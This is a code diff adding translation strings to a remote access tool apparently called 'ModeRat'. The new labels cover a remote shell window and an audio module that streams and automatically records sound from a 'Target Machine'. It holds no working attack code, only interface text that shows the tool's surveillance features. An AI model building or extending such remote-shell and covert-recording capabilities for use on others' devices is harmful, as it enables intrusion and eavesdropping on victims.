@@ -107,4 +107,24 @@ tr = {
     'SETTINGS_MSG_INFO':            u'Information',
     'SETTINGS_MSG_TEXT':            u'Restart the ModeRat',
     # END SETTINGS
+
+    # MSHELL
+    'MSHELL_TITLE':                 u'Remote Shell - Connected to %s - Socket #%s',
+    # END MSHELL
+
+    # MAUDIO
+    'MAUDIO_TITLE':                 u'Audio Streaming from - %s - Socket #%s',
+    'MAUDIO_MSG_TITLE':             u'Error',
+    'MAUDIO_MSG_TEXT':              u'No Recording Device Detected On Target Machine',
+    'MAUDIO_NO_SOUND':              u'No Sound',
+    'MAUDIO_RECORDING':             u'Recording',
+    'MAUDIO_NOT_RECORDING':         u'Not Recording',
+    'MAUDIO_START':                 u'Start',
+    'MAUDIO_RECORD':                u'Record',
+    'MAUDIO_STOP':                  u'Stop',
+    'MAUDIO_AUDIO_DEVICE':          u'Default Audio Device: ',
+    'MAUDIO_RATE':                  u'Rate',
+    'MAUDIO_AUTOMATIC_RECORD':      u'Automatic Recording Settings',
+    'MAUDIO_DETECT_SOUND':          u'Detect Sound \nand Record',
+    # END MAUDIO
 }
